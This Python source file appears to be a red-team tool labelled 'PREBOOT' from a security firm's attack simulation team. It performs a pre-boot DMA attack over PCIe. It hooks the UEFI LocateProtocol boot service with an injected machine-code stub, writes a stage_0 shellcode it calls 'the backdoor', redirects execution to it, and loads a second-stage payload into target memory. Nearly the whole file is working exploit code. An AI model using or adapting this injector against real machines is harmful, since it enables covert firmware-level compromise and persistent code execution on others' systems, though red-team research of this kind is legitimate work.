#
# PREBOOT
# 
# GuidePoint Security LLC
#
# Threat and Attack Simulation Team
#
import os
import time
import pefile
import struct
import logging

from lib import static
from lib import pcie_lib

#
# Static Offsets BootServices
#
OFFSET_BOOTSERVICES = 0x60
OFFSET_BOOTSERVICES_LOCATE_PROTOCOL = 0x140

#
# DMA Status Values
#
DMA_STATUS_STAGE_1          = 1
DMA_STATUS_STAGE_2          = 2
DMA_STATUS_STAGE_3          = 3
DMA_STATUS_STAGE_4          = 4 

DMA_STUB_CODE = [
        b'\x48\xc7\xc0\x00\x00\x01\x00',
        b'\x0f\xae\x38',
        b'\x48\x8b\x00',
		b'\x48\x85\xc0',
		b'\x74\xee',
		b'\xff\xe0'
]
DMA_STUB_CODE_ADDR          = 0x10010
DMA_STUB_FUNC_ADDR          = 0x10000
DMA_STAGE_0_SHELLC          = 0xc0000

#
# typedef struct __attribute__(( packed ))
# {
#       UINT8   DmaStatus;
#       UINT32  ErrorCode;
#       UINT64  ShellCode;
# }
#
DMA_STATUS_SIZE                     = 13
DMA_STATUS_ADDRESS                  = 0x1000 - DMA_STATUS_SIZE
DMA_STATUS_OFFSET_DMA_STATUS        = 0
DMA_STATUS_OFFSET_ERROR_CODE        = 1
DMA_STATUS_OFFSET_SHELL_CODE        = 5

def wait_for_endpoint_init( addr : tuple, retry_timeout : int = static.DEFAULT_RETRY_WAIT ) -> pcie_lib.TransactionLayer:
    """
    Runs in an infinite loop until the device is initialized. On success
    it will return the device.
    """

    dev = None

    while True:
        try:
            # attempt to initialize the socket device
            dev = pcie_lib.TransactionLayer( addr )

            # attempt to read some memory
            dev.mem_read( 0x1000, 2 )

            # return a pointer to the device
            break
        except ( pcie_lib.Endpoint.ErrorNotReady, pcie_lib.Endpoint.ErrorTimeout, pcie_lib.TransactionLayer.ErrorBadCompletion ) as e:
            # We are 'connected' but could not do anything yet as the PCIE device isnt linked yet.
            logging.error( e )

        # If we have a device!
        if dev != None:
            dev.close()
            dev = None

        # sleep for a brief period
        time.sleep( retry_timeout )

    # return the device on success
    return dev

def is_valid_dxe_addr( address : int ) -> bool:
    """
    Returns true if it is a valid DXE address
    """
    if address > 0x1000 and address < 0xffffffff:
        return True
    else:
        return False

def inject_efi_stager_wait_for_status( device : pcie_lib.TransactionLayer, status_code : int, retry_wait : int = static.DEFAULT_RETRY_WAIT ) -> int:
    """
    Reads from the stage_0 the current status.
    """
    while True:
        # read the current status code
        current_status_code = device.mem_read_1( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_DMA_STATUS );

        # is this our status?
        if current_status_code == status_code:
            break

        # status not receieveiped, loop back
        time.sleep( retry_wait );

def inject_efi_staged( device : pcie_lib.TransactionLayer, efi_system_table : int, stage_1_buffer : bytes, retry_wait : int = static.DEFAULT_RETRY_WAIT ) -> None:
    """
    Injects a EFI shellcode using the stage_0 transition code and a stub. Prints the
    status of the injection.
    """

    error_code = None

    # has the stage_0 bootloader been compiled?
    if not os.path.isfile( './source/stage_0/stage_0.x64.bin' ):
        logging.error( 'stage_0 has not been compiled.' );
        return
    else:
        # read the file into the buffer
        stage_0_f = open( './source/stage_0/stage_0.x64.bin', 'rb+' )
        stage_0_c = stage_0_f.read()
        stage_0_f.close()

    # is this address valid?
    assert is_valid_dxe_addr( efi_system_table )

    # read the boot services address
    efi_boot_service = device.mem_read_8( efi_system_table + OFFSET_BOOTSERVICES );

    # is this address valid?
    assert is_valid_dxe_addr( efi_boot_service )

    # print the address!
    logging.debug( f'EFI_SYSTEM_TABLE->EFI_BOOT_SERVICES @ {hex(efi_boot_service)}' )

    # read the locate protocol address
    efi_locate_proto = device.mem_read_8( efi_boot_service + OFFSET_BOOTSERVICES_LOCATE_PROTOCOL );

    # is this address valid?
    assert is_valid_dxe_addr( efi_locate_proto )

    # print the address!
    logging.debug( f'EFI_SYSTEM_TABLE->EFI_BOOT_SERVICES->LocateProtocol @ {hex(efi_locate_proto)}' )

    # inject the DMA stub
    device.mem_write( DMA_STUB_CODE_ADDR, b''.join( DMA_STUB_CODE ) );

    # hook LocateProtocol!
    device.mem_write_8( DMA_STUB_FUNC_ADDR, 0 );
    device.mem_write_8( efi_boot_service + OFFSET_BOOTSERVICES_LOCATE_PROTOCOL, DMA_STUB_CODE_ADDR );

    if stage_1_buffer:
        config  = struct.pack( '<Q', efi_locate_proto );
        config += struct.pack( '<Q', efi_system_table );
        config += struct.pack( '<Q', len( stage_1_buffer ) );
        config += struct.pack( '<Q', DMA_STATUS_ADDRESS );
    else:
        config  = struct.pack( '<Q', efi_locate_proto );
        config += struct.pack( '<Q', efi_system_table );
        config += struct.pack( '<Q', 0 );
        config += struct.pack( '<Q', DMA_STATUS_ADDRESS );

    # write the backdoor
    device.mem_write( DMA_STAGE_0_SHELLC, stage_0_c + config );

    # reset DMA status memory
    device.mem_write_1( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_DMA_STATUS, 0 );
    device.mem_write_4( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_ERROR_CODE, 0 );
    device.mem_write_8( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_SHELL_CODE, 0 );

    # redirect execution to our stage_0 shellcode
    device.mem_write_8( DMA_STUB_FUNC_ADDR, DMA_STAGE_0_SHELLC );

    # wait for the status to complete
    inject_efi_stager_wait_for_status( device, DMA_STATUS_STAGE_1, retry_wait = retry_wait );

    if stage_1_buffer:
        # success! read the address for the second stage
        shell_code_ptr = device.mem_read_8( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_SHELL_CODE );

        # is this a valid address
        assert is_valid_dxe_addr( shell_code_ptr )

        # print the address!
        logging.info( f'Stage_0 successfully initialized.' )
        
        logging.debug( f'Stage_1 buffer @ {hex(shell_code_ptr)}' )

        # write our shellcode to the buf!
        device.mem_write( shell_code_ptr, stage_1_buffer );

        # print that it was written!
        logging.debug( f'Stage_1 written {len(stage_1_buffer)} bytes @ {hex(shell_code_ptr)}' )

    # get the time
    t = time.time()

    # notify we are ready to continue
    device.mem_write_1( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_DMA_STATUS, DMA_STATUS_STAGE_2 );

    #  wait for the status to complete
    inject_efi_stager_wait_for_status( device, DMA_STATUS_STAGE_3, retry_wait = retry_wait );

    if stage_1_buffer:
        # Print that we succeeed!
        logging.info( f'Stage_1 execution took {time.time() - t} seconds' );

        # print the stage_1 status!
        stage_1_code = device.mem_read_4( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_ERROR_CODE );

        # return the error code
        error_code = stage_1_code

    # notify we are ready to start the boot process
    device.mem_write_1( DMA_STATUS_ADDRESS + DMA_STATUS_OFFSET_DMA_STATUS, DMA_STATUS_STAGE_4 );

    # return the error code
    return error_code
